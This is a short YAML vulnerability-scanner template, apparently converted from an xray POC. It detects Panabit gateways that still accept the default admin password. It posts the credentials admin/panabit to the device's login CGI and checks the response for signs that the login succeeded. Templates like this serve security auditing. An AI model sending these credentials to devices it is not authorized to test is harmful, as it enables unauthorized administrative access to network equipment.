# 来源: xray（转换自 afrog/xray 表达式 POC）
http:
  - body: username=admin&password=panabit
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - URL=/index.htm
        condition: and
      - type: word
        part: header
        words:
          - paonline_admin
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/login/userverify.cgi'
id: panabit-gateway-default-password
